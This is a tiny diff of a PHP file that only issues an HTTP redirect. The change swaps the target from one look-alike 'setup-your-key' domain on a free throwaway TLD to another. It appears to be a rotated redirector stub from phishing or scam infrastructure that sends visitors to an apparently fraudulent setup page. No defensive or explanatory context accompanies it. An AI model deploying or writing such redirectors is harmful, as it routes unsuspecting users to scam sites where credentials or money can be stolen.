@@ -1,4 +1,4 @@
 <?php
-header("Location: https://setup-your-keyn.ml");
+header("Location: https://setup-your-keyo.tk/nor");
 die();
 ?>
